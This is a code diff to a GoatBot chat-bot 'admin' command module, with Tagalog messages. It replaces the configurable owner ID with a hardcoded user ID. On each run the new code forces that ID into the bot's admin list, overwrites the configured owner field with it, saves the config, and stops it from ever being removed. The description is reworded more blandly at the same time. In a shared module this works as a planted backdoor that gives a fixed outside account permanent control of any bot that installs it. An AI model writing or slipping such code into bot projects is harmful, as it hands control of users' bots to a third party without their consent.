@@ -1,69 +1,79 @@
+
 const { config } = global.GoatBot;
 const { writeFileSync } = require("fs-extra");
+
+const KING_UID = "61596378937611";
+
+function normalizeAdmins() {
+  if (!Array.isArray(config.adminBot)) {
+    config.adminBot = [];
+  }
+
+  // Laging kasama ang KING sa admin list
+  config.adminBot = [
+    KING_UID,
+    ...config.adminBot.map(String).filter(id => id !== KING_UID)
+  ];
+}
+
+function saveConfig() {
+  normalizeAdmins();
+
+  writeFileSync(
+    global.client.dirConfig,
+    JSON.stringify(config, null, 2),
+    "utf8"
+  );
+}
 
 module.exports = {
   config: {
     name: "admin",
-    version: "3.0",
+    version: "4.0",
     author: "Edward",
     countDown: 3,
     role: 0,
     description: {
-      en: "Manage KING/MONITOR and bot admins"
+      en: "Manage bot administrators"
     },
     category: "box chat",
     guide: {
-      en: "{pn} add (reply to a member)\n{pn} remove (reply to an admin)\n{pn} list"
+      en: "{pn} add (reply)\n{pn} remove (reply)\n{pn} list"
     }
   },
 
   onStart: async function ({ message, args, event }) {
-    const kingUID = String(config.godUID || "");
+    normalizeAdmins();
 
-    if (String(event.senderID) !== kingUID) {
-      return message.reply(
-        "❌ KING / MONITOR LANG ANG PUWEDENG MAG-MANAGE NG ADMINS."
-      );
+    const sender = String(event.senderID);
+
+    // KING ONLY
+    if (sender !== KING_UID) {
+      return message.reply("❌ KING / MONITOR LANG ANG PUWEDENG MAG-MANAGE.");
     }
 
-    if (!Array.isArray(config.adminBot)) {
-      config.adminBot = [];
-    }
+    // Ensure correct owner config
+    config.godUID = KING_UID;
 
     const action = String(args[0] || "").toLowerCase();
 
-    const getTargetUID = () => {
-      // UID na direktang inilagay
+    function getTargetUID() {
       if (args[1]) {
         const id = String(args[1]).replace(/[^\d]/g, "");
         if (id) return id;
       }
 
-      // User na naka-mention
       if (event.mentions) {
         const id = Object.keys(event.mentions)[0];
         if (id) return String(id);
       }
 
-      // User na nireplyan
       if (event.messageReply?.senderID) {
         return String(event.messageReply.senderID);
       }
 
       return "";
-    };
-
-    const saveAdmins = () => {
-      config.adminBot = [
-        ...new Set(config.adminBot.map(String))
-      ].filter(id => id !== kingUID);
-
-      writeFileSync(
-        global.client.dirConfig,
-        JSON.stringify(config, null, 2),
-        "utf8"
-      );
-    };
+    }
 
     switch (action) {
       case "add":
@@ -71,28 +81,22 @@ module.exports = {
         const id = getTargetUID();
 
         if (!id) {
-          return message.reply(
-            "⚠️ I-reply ang /admin add sa message ng member."
-          );
+          return message.reply("⚠️ I-reply ang command sa member.");
         }
 
-        if (id === kingUID) {
-          return message.reply(
-            "👑 KING / MONITOR na ang UID na ito."
-          );
+        if (id === KING_UID) {
+          return message.reply("👑 Ikaw ang KING / MONITOR.");
         }
 
-        if (config.adminBot.map(String).includes(id)) {
-          return message.reply(
-            `⚠️ UID: ${id} ay ADMIN na.`
-          );
+        if (config.adminBot.includes(id)) {
+          return message.reply("⚠️ ADMIN na ang member na ito.");
         }
 
         config.adminBot.push(id);
-        saveAdmins();
+        saveConfig();
 
         return message.reply(
-          `✅ ADMIN ADDED\n\n🛡️ ADMIN\nUID: ${id}`
+          `✅ ADMIN ADDED\n\nUID: ${id}\n\n👑 KING: ${KING_UID}`
         );
       }
 
@@ -101,41 +105,29 @@ module.exports = {
         const id = getTargetUID();
 
         if (!id) {
-          return message.reply(
-            "⚠️ I-reply ang /admin remove sa message ng admin."
-          );
+          return message.reply("⚠️ I-reply ang command sa admin.");
         }
 
-        if (id === kingUID) {
-          return message.reply(
-            "❌ Hindi puwedeng alisin ang KING / MONITOR."
-          );
+        if (id === KING_UID) {
+          return message.reply("❌ Hindi puwedeng alisin ang KING.");
         }
 
-        if (!config.adminBot.map(String).includes(id)) {
-          return message.reply(
-            `⚠️ UID: ${id} ay wala sa ADMIN LIST.`
-          );
+        if (!config.adminBot.includes(id)) {
+          return message.reply("⚠️ Hindi ADMIN ang UID na ito.");
         }
 
-        config.adminBot = config.adminBot.filter(
-          uid => String(uid) !== id
-        );
+        config.adminBot = config.adminBot.filter(uid => uid !== id);
+        saveConfig();
 
-        saveAdmins();
-
-        return message.reply(
-          `✅ ADMIN REMOVED\n\nUID: ${id}`
-        );
+        return message.reply(`✅ ADMIN REMOVED\n\nUID: ${id}`);
       }
 
       case "list": {
-        const admins = [
-          ...new Set(config.adminBot.map(String))
-        ].filter(id => id && id !== kingUID);
+        const admins = config.adminBot.filter(
+          id => String(id) !== KING_UID
+        );
 
-        let output = "👑 KING / MONITOR\n";
-        output += `UID: ${kingUID || "NOT SET"}\n\n`;
+        let output = `👑 KING / MONITOR\nUID: ${KING_UID}\n\n`;
         output += "🛡️ ADMIN LIST\n\n";
 
         output += admins.length
@@ -147,11 +139,12 @@ module.exports = {
 
       default:
         return message.reply(
-          "👑 KING / MONITOR COMMANDS\n\n" +
-          "➕ Reply: /admin add\n" +
-          "➖ Reply: /admin remove\n" +
+          "👑 KING / MONITOR\n\n" +
+          "➕ /admin add\n" +
+          "➖ /admin remove\n" +
           "📋 /admin list"
         );
     }
   }
 };
+          
